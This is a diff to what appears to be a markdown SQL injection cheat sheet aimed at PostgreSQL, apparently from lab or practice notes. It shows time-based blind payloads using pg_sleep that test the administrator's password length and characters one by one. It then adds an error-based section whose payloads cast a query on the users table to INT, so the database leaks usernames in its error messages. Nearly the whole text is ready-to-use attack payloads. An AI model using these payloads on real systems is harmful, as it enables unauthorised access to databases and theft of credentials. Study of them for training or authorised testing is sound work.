@@ -143,6 +143,16 @@ SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
 SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END from users--
 SELECT CASE WHEN (username='administrator' AND LENGTH(password)>20) THEN pg_sleep(10) ELSE pg_sleep(0) END from users--
 SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END from users--
+```
+
+#### VISIBLE ERROR
+
+```sql
+'or 1=cast((select 1)as INT) -- -'
+'or 1=cast((select 'a')as INT) -- -'
+'or 1=cast((select username from users limit 1)as INT)-- -'
+
+
 
 ```
 
